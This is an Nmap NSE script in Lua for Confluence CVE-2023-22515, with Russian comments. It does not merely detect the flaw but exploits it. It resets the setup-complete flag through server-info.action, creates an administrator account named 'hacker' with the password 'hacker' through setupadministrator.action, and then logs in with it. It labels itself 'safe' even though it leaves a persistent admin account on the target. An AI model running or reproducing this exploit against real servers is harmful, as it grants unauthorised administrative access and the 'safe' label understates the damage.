local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"

description = [[
 CVE-2023-22515
]]

author = "Sirotkin Oleg"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "safe"}

portrule = shortport.port_or_service(8090, "http", "tcp", "open")

-- функция для URL-кодирования
local function url_encode(str)
    if not str then return "" end
    str = str:gsub("([^%w ])",
        function(c)
            return string.format("%%%02X", string.byte(c))
        end)
    str = str:gsub(" ", "+")
    return str
end

-- Преобразование таблицы в строку 
local function table_to_urlencoded(tbl)
    local result = {}
    for k, v in pairs(tbl) do
        local encoded_k = url_encode(k)
        local encoded_v = url_encode(v)
        table.insert(result, encoded_k .. "=" .. encoded_v)
    end
    return table.concat(result, "&")
end

-- Отправка GET-запроса
local function send_get_request(host, port, path)
    local response = http.get(host, port, path)
    
    if response and (response.status == 200 or response.status == 302) then
        stdnse.debug1("GET request to " .. path .. " succeeded with status: " .. tostring(response.status))
        return response.body
    else
        stdnse.debug1("GET request to " .. path .. " failed with status: " .. tostring(response.status))
        return nil
    end
end

-- Отправка POST-запроса
local function send_post_request(host, port, path, data_table)
    local data = table_to_urlencoded(data_table)

    if not data or data == "" then
        stdnse.debug2("Error: Data to send is empty or nil.")
        return false
    end

    local headers = {
        ["Content-Type"] = "application/x-www-form-urlencoded",
        ["Content-Length"] = tostring(#data),
        ["X-Atlassian-Token"] = "no-check"
    }

    
    local options = {
        header = headers,
        content = data
    }

    -- Отправка POST-запроса
    local response = http.post(host, port, path, options)
    
    if response and (response.status == 200 or response.status == 302) then
        stdnse.debug1("POST request to " .. path .. " succeeded with status: " .. tostring(response.status))
        return response.body
    else
        stdnse.debug1("POST request to " .. path .. " failed with status: " .. tostring(response.status))
        return nil
    end
end

action = function(host, port)
    local setup_path = "/setup/setupadministrator.action"
    local server_info_path = "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
    local login_path = "/login.action?logout=true"

    local username = "hacker"
    local password = "hacker"
    local data_table = {
        username = username,
        password = password,
        confirm = password,
        fullName = "hacker oleg",
        email = "hacker@example.com"
    }
    local login_data = {
        os_username = username,
        os_password = password,
        login = "Log In"
    }

    stdnse.debug1("Starting action.")

    -- GET-запрос к /setup/setupadministrator.action
    local setup_get_success = send_get_request(host, port, setup_path)
    if not setup_get_success then
        return "CVE-2023-22515 vulnerability not detected."
    end

    -- GET-запрос к /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
    local server_info_get_success = send_get_request(host, port, server_info_path)
    if not server_info_get_success then
        return "CVE-2023-22515 vulnerability not detected."
    end

    -- POST-запрос для создания администратора
    local post_success = send_post_request(host, port, setup_path, data_table)
    if not post_success then
        return "CVE-2023-22515 vulnerability not detected."
    end

    -- GET-запрос для проверки доступности страницы login.action
    send_get_request(host, port, login_path)

    -- POST-запрос для авторизации
    local login_response = send_post_request(host, port, login_path, login_data)

    if login_response then
        if login_response:find("Sorry, your username and/or password are incorrect. Please try again.") then
            return "CVE-2023-22515 not detected"
        elseif login_response:find("You are currently logged in") then
            return "CVE-2023-22515 vulnerability detected and administrator account created successfully."
        else
            return "CVE-2023-22515 vulnerability detected, but unable to confirm."
        end
    else
        return "CVE-2023-22515 vulnerability not detected."
    end
end
